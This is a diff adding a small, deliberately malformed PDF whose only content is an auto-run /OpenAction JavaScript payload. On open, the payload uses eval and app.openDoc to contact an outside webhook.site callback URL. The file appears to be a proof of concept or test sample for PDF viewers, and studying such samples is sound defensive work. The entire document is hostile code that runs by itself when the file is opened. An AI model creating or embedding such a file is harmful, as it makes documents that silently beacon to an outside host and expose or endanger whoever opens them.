@@ -1,0 +1,19 @@
+%PDF-1.4
+1 0 obj
+<<>>
+%endobj
+trailer
+<<
+/Root
+  <</Pages <<>>
+  /OpenAction
+      <<
+      /S/JavaScript
+      /JS(
+      eval(
+          'app.openDoc({cPath: encodeURI("https://webhook.site/b9d363bc-29e1-46ca-b0d0-63e781967243"), cFS: "CHTTP" });'
+          );
+      )
+      >>
+  >>
+>>
